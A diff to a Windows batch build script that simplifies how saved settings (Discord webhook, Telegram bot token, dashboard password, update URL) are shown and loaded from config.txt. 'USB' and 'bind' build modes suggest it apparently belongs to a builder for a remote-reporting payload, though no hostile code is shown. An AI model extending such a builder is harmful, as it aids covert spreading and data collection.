@@ -42,14 +42,7 @@ REM Check if saved config exists
 if not exist config.txt goto :usb_ask_config
 echo   Found saved configuration (config.txt):
 echo.
-for /f "tokens=1,* delims==" %%a in (config.txt) do (
-    if "%%a"=="DISCORD_WEBHOOK" echo     Discord Webhook: %%b
-    if "%%a"=="DISCORD_USERNAME" echo     Discord Name: %%b
-    if "%%a"=="DASHBOARD_PASSWORD" echo     Dashboard Password: %%b
-    if "%%a"=="TELEGRAM_BOT_TOKEN" echo     Telegram Token: %%b
-    if "%%a"=="TELEGRAM_CHAT_ID" echo     Telegram Chat ID: %%b
-    if "%%a"=="UPDATE_URL" echo     Update URL: %%b
-)
+for /f "usebackq tokens=1,* delims==" %%a in ("config.txt") do echo     %%a: %%b
 echo.
 set /p "USE_SAVED=  Use saved config? (y/n): "
 if /i "!USE_SAVED!"=="y" goto :usb_load_config
@@ -101,14 +94,7 @@ echo   Configuration saved to config.txt for next build.
 goto :usb_config_done
 
 :usb_load_config
-for /f "tokens=1,* delims==" %%a in (config.txt) do (
-    if "%%a"=="DISCORD_WEBHOOK" set "DISCORD_WEBHOOK=%%b"
-    if "%%a"=="DISCORD_USERNAME" set "DISCORD_USERNAME=%%b"
-    if "%%a"=="DASHBOARD_PASSWORD" set "DASHBOARD_PASSWORD=%%b"
-    if "%%a"=="TELEGRAM_BOT_TOKEN" set "TELEGRAM_BOT_TOKEN=%%b"
-    if "%%a"=="TELEGRAM_CHAT_ID" set "TELEGRAM_CHAT_ID=%%b"
-    if "%%a"=="UPDATE_URL" set "UPDATE_URL=%%b"
-)
+for /f "usebackq tokens=1,* delims==" %%a in ("config.txt") do set "%%a=%%b"
 echo   Loaded saved config.
 
 :usb_config_done
@@ -300,14 +286,7 @@ REM Check if saved config exists
 if not exist config.txt goto :bind_ask_config
 echo   Found saved configuration (config.txt):
 echo.
-for /f "tokens=1,* delims==" %%a in (config.txt) do (
-    if "%%a"=="DISCORD_WEBHOOK" echo     Discord Webhook: %%b
-    if "%%a"=="DISCORD_USERNAME" echo     Discord Name: %%b
-    if "%%a"=="DASHBOARD_PASSWORD" echo     Dashboard Password: %%b
-    if "%%a"=="TELEGRAM_BOT_TOKEN" echo     Telegram Token: %%b
-    if "%%a"=="TELEGRAM_CHAT_ID" echo     Telegram Chat ID: %%b
-    if "%%a"=="UPDATE_URL" echo     Update URL: %%b
-)
+for /f "usebackq tokens=1,* delims==" %%a in ("config.txt") do echo     %%a: %%b
 echo.
 set /p "USE_SAVED=  Use saved config? (y/n): "
 if /i "!USE_SAVED!"=="y" goto :bind_load_config
@@ -354,14 +333,7 @@ echo   Configuration saved to config.txt for next build.
 goto :bind_config_done
 
 :bind_load_config
-for /f "tokens=1,* delims==" %%a in (config.txt) do (
-    if "%%a"=="DISCORD_WEBHOOK" set "DISCORD_WEBHOOK=%%b"
-    if "%%a"=="DISCORD_USERNAME" set "DISCORD_USERNAME=%%b"
-    if "%%a"=="DASHBOARD_PASSWORD" set "DASHBOARD_PASSWORD=%%b"
-    if "%%a"=="TELEGRAM_BOT_TOKEN" set "TELEGRAM_BOT_TOKEN=%%b"
-    if "%%a"=="TELEGRAM_CHAT_ID" set "TELEGRAM_CHAT_ID=%%b"
-    if "%%a"=="UPDATE_URL" set "UPDATE_URL=%%b"
-)
+for /f "usebackq tokens=1,* delims==" %%a in ("config.txt") do set "%%a=%%b"
 echo   Loaded saved config.
 
 :bind_config_done
